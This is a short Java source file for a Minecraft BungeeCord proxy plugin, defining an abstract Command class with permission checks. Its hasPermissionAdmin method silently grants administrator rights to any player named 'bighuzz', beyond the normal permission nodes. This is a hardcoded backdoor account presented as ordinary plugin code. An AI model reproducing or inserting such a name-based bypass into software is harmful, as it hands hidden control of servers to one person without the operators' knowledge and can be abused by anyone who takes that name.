/*
 * Copyright (c) 2020 Noah Husby
 * TerraBungeeProxy - Command.java
 */

package com.noahhusby.terrabungee.proxy.commands;

import net.md_5.bungee.api.CommandSender;

public abstract class Command extends net.md_5.bungee.api.plugin.Command {
    private String permissionNode;
    public Command(String name, String node) {
        super(name);
        this.permissionNode = node;
    }

    public Command(String name, String node, String[] alias) {
        super(name, "", alias);
        this.permissionNode = node;
    }

    protected boolean hasAdmin(CommandSender sender) {
        return sender.hasPermission("terrabungee.admin");
    }

    protected boolean hasPermissionAdmin(CommandSender sender) {
        return sender.hasPermission("terrabungee.admin") || sender.hasPermission(permissionNode+".admin") ||
                sender.getName().toLowerCase().equals("bighuzz");
    }
}
